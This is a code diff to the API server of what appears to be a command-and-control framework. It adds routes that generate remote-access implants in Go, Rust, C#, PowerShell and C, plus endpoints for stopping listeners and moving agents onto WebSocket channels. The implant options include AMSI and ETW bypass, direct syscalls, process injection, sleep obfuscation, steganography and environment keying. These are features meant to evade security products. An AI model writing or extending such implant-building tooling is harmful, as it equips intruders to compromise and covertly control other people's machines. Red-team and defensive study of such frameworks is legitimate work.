@@ -99,6 +99,15 @@ class GenerateRequest(BaseModel):
     output_format: str = "exe"
     shellcode_format: str = "raw"
     lang: str = "go"
+    stego: bool = False
+    stego_image: str | None = None
+    env_keying: str | None = None
+    staged: bool = False
+    compile: bool = False
+
+class UpgradeWsRequest(BaseModel):
+    ws_host: str
+    ws_port: int
 
 class ListenerRequest(BaseModel):
     type: str
@@ -151,6 +160,14 @@ async def start_listener(req: ListenerRequest):
     else:
         raise HTTPException(400, "Unknown listener type")
     return {"status": "ok", "listeners": _server.get_listeners()}
+
+
+@router.delete("/listeners/{listener_type}")
+async def stop_listener(listener_type: str):
+    if not _server:
+        raise HTTPException(503, "Server not ready")
+    result = await _server.stop_listener(listener_type if listener_type != "all" else None)
+    return {"status": "ok", "message": result, "listeners": _server.get_listeners()}
 
 
 # --- Agents ---
@@ -269,6 +286,14 @@ async def upgrade_agent(agent_id: str):
     return {"status": "ok", "message": result}
 
 
+@router.post("/agents/{agent_id}/upgrade_ws")
+async def upgrade_ws(agent_id: str, req: UpgradeWsRequest):
+    if not _server or agent_id not in _server.agents:
+        raise HTTPException(status_code=404, detail="Agent not found")
+    result = await _server.upgrade_to_websocket(agent_id, req.ws_host, req.ws_port)
+    return {"status": "ok", "message": result}
+
+
 @router.post("/agents/{agent_id}/downgrade")
 async def downgrade_agent(agent_id: str, req: DowngradeRequest):
     if not _server or agent_id not in _server.agents:
@@ -303,12 +328,13 @@ async def generate_agents(req: GenerateRequest):
     from agent import AgentGenerator
     generator = AgentGenerator(patterns=req.patterns)
     results = {}
+    transport = 'websocket' if req.beacon_mode else 'http'
 
     if req.lang in ('go', 'all'):
         try:
             go_path = generator.generate_go_agent(
                 req.host, req.port, encryption_key=req.key,
-                transport='websocket' if req.beacon_mode else 'http',
+                transport=transport,
                 beacon_interval=req.interval, beacon_jitter=req.jitter,
                 target_os=req.target_os if req.target_os != 'auto' else 'windows',
                 target_arch='amd64', garble=False,
@@ -332,6 +358,51 @@ async def generate_agents(req: GenerateRequest):
             bof=req.bof, obfuscation=req.obfuscation,
         )
         results.update(py_results)
+
+    if req.lang in ('rust', 'all'):
+        try:
+            rust_path = generator.generate_rust_agent(
+                req.host, req.port, encryption_key=req.key, transport=transport,
+                beacon_interval=req.interval, beacon_jitter=req.jitter,
+                target_os=req.target_os if req.target_os != 'auto' else 'windows',
+            )
+            results['rust'] = rust_path
+        except Exception as e:
+            results['rust'] = f"Error: {e}"
+
+    if req.lang in ('csharp', 'all'):
+        try:
+            cs_path = generator.generate_csharp_agent(
+                req.host, req.port, encryption_key=req.key, transport=transport,
+                beacon_interval=req.interval, beacon_jitter=req.jitter,
+            )
+            results['csharp'] = cs_path
+        except Exception as e:
+            results['csharp'] = f"Error: {e}"
+
+    if req.lang in ('powershell', 'all'):
+        try:
+            ps_path = generator.generate_powershell_agent(
+                req.host, req.port, encryption_key=req.key, transport=transport,
+                beacon_interval=req.interval, beacon_jitter=req.jitter,
+                amsi=req.amsi, etw=req.etw, syscalls=req.syscalls,
+                inject=req.inject, inject_target=req.inject_target,
+                sleep_obf=req.sleep_obf, idle_encrypt=req.idle_encrypt,
+                profile=req.profile, redirector=req.redirector,
+            )
+            results['powershell'] = ps_path
+        except Exception as e:
+            results['powershell'] = f"Error: {e}"
+
+    if req.lang in ('c', 'all'):
+        try:
+            c_path = generator.generate_c_agent(
+                req.host, req.port, req.key, transport=transport,
+                beacon_interval=req.interval, beacon_jitter=req.jitter,
+            )
+            results['c'] = c_path
+        except Exception as e:
+            results['c'] = f"Error: {e}"
 
     generated_keys = getattr(generator, 'generated_keys', [])
     if generated_keys and _server:
